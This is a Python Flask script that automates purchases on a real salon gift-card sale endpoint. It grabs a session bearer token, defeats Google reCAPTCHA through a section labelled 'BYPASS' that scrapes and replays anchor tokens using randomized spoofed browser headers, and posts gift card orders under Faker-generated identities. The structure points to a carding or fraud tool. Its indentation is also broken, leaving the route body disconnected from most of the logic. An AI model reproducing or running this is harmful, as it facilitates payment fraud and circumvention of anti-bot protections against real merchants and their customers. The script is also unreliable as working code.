import json
import re
import random
from faker import Faker
from flask import Flask, request, jsonify
import httpx

app = Flask(__name__)

def cap(string, start, end):
    return re.search(f'{re.escape(start)}(.*?){re.escape(end)}', string).group(1)

def Capture(string, starting_word, ending_word):
    substring_start = string.find(starting_word)
    substring_start += len(starting_word)
    size = string.find(ending_word, substring_start) - substring_start
    return string[substring_start:substring_start+size]

@app.route('/process', methods=['POST'])
def process():
    # Your existing code here

    # Tenant/Template
    ids = [
        '101032|592faa18-5887-49da-a878-ab040111017c',
        '101060|757787b1-3533-4dda-99ab-ab4201177751',
        '101093|38a71632-5e92-4710-8546-ab59013ab3a6'
    ]

    chosen_id = random.choice(ids)
    tenant_id, template_TId = chosen_id.split("|")


    # CURL -1
headers = {
    'Host': 'na0.meevo.com',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0',
    'Accept': 'application/json, text/plain, */*',
    'Accept-Language': 'en-US,en;q=0.5'
}

with httpx.Client() as client:
    response = client.get(f'https://na0.meevo.com/egift/egft/RcToken?tenantId={tenant_id}&version=1&locationId=null&logOut=false&stashId=null', headers=headers)
    data = response.json()

SID = cap(response.text, '"sessionId":"', '"')
UID = cap(response.text, '"userId":"', '"')
TOK = cap(response.text, '"bearerToken":"', '"')

#print(SID)
#print(tenant_id)

anchor_link = 'https://www.google.com/recaptcha/api2/anchor?ar=1&k=6Lc4z-AUAAAAAOxF55bnvTnPaKm2sDTZN0wrAmet&co=aHR0cHM6Ly9uYTAubWVldm8uY29tOjQ0Mw..&hl=en&v=NZrMWHVy58-S9gVvad9HVGxk&size=invisible&badge=bottomright&cb=7q1yi7bsv8yw'
anchor_ref = '' # Open Anchor Headers and see the referer link

reload_link = 'https://www.google.com/recaptcha/api2/reload?k=6Lc4z-AUAAAAAOxF55bnvTnPaKm2sDTZN0wrAmet'
v = 'NZrMWHVy58-S9gVvad9HVGxk'
k = '6Lc4z-AUAAAAAOxF55bnvTnPaKm2sDTZN0wrAmet'
co = 'aHR0cHM6Ly9uYTAubWVldm8uY29tOjQ0Mw..'
chr = '[38,46,47]'
bg = '!urygvLkKAAQeCR5ubQEHnAgE' 
vh = '-1020083849'

# BYPASS
headers = {
    'authority': 'www.google.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    'accept-language': 'en-US,en;q=0.9',
    'referer': anchor_ref,
    'sec-fetch-dest': 'iframe',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'cross-site',
    'upgrade-insecure-requests': '1',
    'user-agent': f'Mozilla/5.0 (Windows NT {random.randint(11,99)}.0; Win64; x64) AppleWebKit/{random.randint(111,999)}.{random.randint(11,99)} (KHTML, like Gecko) Chrome/{random.randint(11,99)}.0.{random.randint(1111,9999)}.{random.randint(111,999)} Safari/{random.randint(111,999)}.{random.randint(11,99)}'
}

with httpx.Client() as client:
    response = client.get(anchor_link, headers=headers)
    rtk = Capture(response.text, '<input type="hidden" id="recaptcha-token" value="', '"')

data = {
    'v': v,
    'reason': 'q',
    'c': rtk,
    'k': k,
    'co': co,
    'hl': 'en',
    'size': 'invisible',
    'chr': chr,
    'vh': vh,
    'bg': bg
}

with httpx.Client() as client:
    response = client.post(reload_link, headers=headers, data=data)
    captcha = Capture(response.text, '["rresp","', '"')

url = f'https://na0.meevo.com/egift/egft/Sale?tenantId={tenant_id}'
headers = {
    'Host': 'na0.meevo.com',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0',
    'Accept': 'application/json, text/plain, */*',
    'Accept-Language': 'en-US,en;q=0.5',
    'Authorization': f'Bearer {TOK}',
    'Content-Type': 'application/json',
    'Origin': 'https://na0.meevo.com'
}

fake = Faker()
email = fake.email()
zip_code = fake.zipcode()
name = fake.first_name()
last = fake.last_name()

payload = {
    "giftCards": [
        {
            "templateId": template_TId,
            "emailAddressFrom": email, 
            "emailAddressTo": email,
            "message": f"{name} {last}",
            "fullNameFrom": f"{name} {last}",
            "firstNameTo": name,
            "lastNameTo": last,
            "deliveryMethod": 30545,
            "saleLineItem": {
                "clientGiftCard": {
                    "remainingAmount": 10
                },
                "startDate": "2024-01-28"
            },
            "hideOriginalAmount": False,
            "shippingFeeId": None,
            "shippingAddress": {}
        }
    ],
    "rcToken": captcha,
    "rcVersion": 1,
    "billingPostalCode": "10080"
}

# Make the request
with httpx.Client() as client:
    response = client.post(url, headers=headers, json=payload)


    return jsonify({"response": response})

if __name__ == '__main__':
    app.run(debug=True)
